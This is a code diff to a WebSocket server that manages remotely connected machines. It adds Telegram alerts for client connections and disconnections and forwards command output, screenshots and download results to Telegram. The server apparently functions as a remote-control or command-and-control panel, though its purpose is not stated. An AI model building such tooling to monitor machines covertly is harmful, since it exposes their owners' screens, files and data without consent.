@@ -365,6 +365,21 @@ const wsHandler = (ws, req) => {
                         client: formattedClient
                     });
                     console.log('Broadcasted new client to admin sessions');
+
+                    // Send Telegram notification for new client connection
+                    try {
+                        if (telegramService.isEnabled() && telegramService.getConfig().notifications.newConnection) {
+                            const clientInfo = {
+                                uuid: data.uuid,
+                                computerName: data.computerName || 'Unknown',
+                                ipAddress: data.ipAddress || 'Unknown',
+                                platform: data.platform || 'Unknown'
+                            };
+                            await telegramService.sendNewConnectionNotification(clientInfo);
+                        }
+                    } catch (telegramError) {
+                        console.error('[TELEGRAM] Error sending new connection notification:', telegramError);
+                    }
                 } catch (integrationError) {
                     console.error('Integration layer registration failed:', integrationError.message);
                     
@@ -585,6 +600,46 @@ const wsHandler = (ws, req) => {
                 console.log(`[OUTPUT] Broadcasting to ${adminSessions.size} admin sessions:`, JSON.stringify(broadcastMessage));
                 broadcastToAdminSessions(broadcastMessage);
                 console.log(`[OUTPUT] Broadcast complete`);
+
+                // Send to Telegram if enabled
+                try {
+                    if (telegramService.isEnabled()) {
+                        const client = connectedClients.get(ws.uuid);
+                        if (client) {
+                            const clientInfo = {
+                                uuid: ws.uuid,
+                                computerName: client.computerName || 'Unknown',
+                                ipAddress: client.ipAddress || 'Unknown',
+                                platform: client.platform || 'Unknown'
+                            };
+
+                            // Handle different types of outputs
+                            if (status === 'success' && output) {
+                                // Check if it's a screenshot command
+                                if (originalTask && originalTask.command && originalTask.command.toLowerCase().includes('screenshot')) {
+                                    // For screenshots, we'll send the base64 data as an image
+                                    if (output.startsWith('data:image/')) {
+                                        await telegramService.sendScreenshot(clientInfo, output, 'Screenshot captured');
+                                    } else {
+                                        // If it's not base64, send as text
+                                        await telegramService.sendCommandOutput(clientInfo, originalTask.command, output, status);
+                                    }
+                                } else if (originalTask && originalTask.command && originalTask.command.toLowerCase().includes('download')) {
+                                    // For download commands, send file info
+                                    await telegramService.sendFileDownload(clientInfo, originalTask.command, output, status);
+                                } else {
+                                    // For other commands, send as text output
+                                    await telegramService.sendCommandOutput(clientInfo, originalTask ? originalTask.command : 'Unknown Command', output, status);
+                                }
+                            } else if (status === 'error') {
+                                // Send error messages
+                                await telegramService.sendCommandOutput(clientInfo, originalTask ? originalTask.command : 'Unknown Command', output, status);
+                            }
+                        }
+                    }
+                } catch (telegramError) {
+                    console.error('[TELEGRAM] Error sending output to Telegram:', telegramError);
+                }
 
                 // Clean up the map entry
                 if (taskToCorrelationMap.has(taskId)) {
@@ -1124,6 +1179,21 @@ const wsHandler = (ws, req) => {
                     type: 'client_status_update',
                     client: formattedClient
                 });
+
+                // Send Telegram notification for client disconnection
+                try {
+                    if (telegramService.isEnabled() && telegramService.getConfig().notifications.disconnection) {
+                        const clientInfo = {
+                            uuid: ws.uuid,
+                            computerName: updatedClient.computerName || 'Unknown',
+                            ipAddress: updatedClient.ipAddress || 'Unknown',
+                            platform: updatedClient.platform || 'Unknown'
+                        };
+                        await telegramService.sendDisconnectionNotification(clientInfo);
+                    }
+                } catch (telegramError) {
+                    console.error('[TELEGRAM] Error sending disconnection notification:', telegramError);
+                }
             }
         }
         
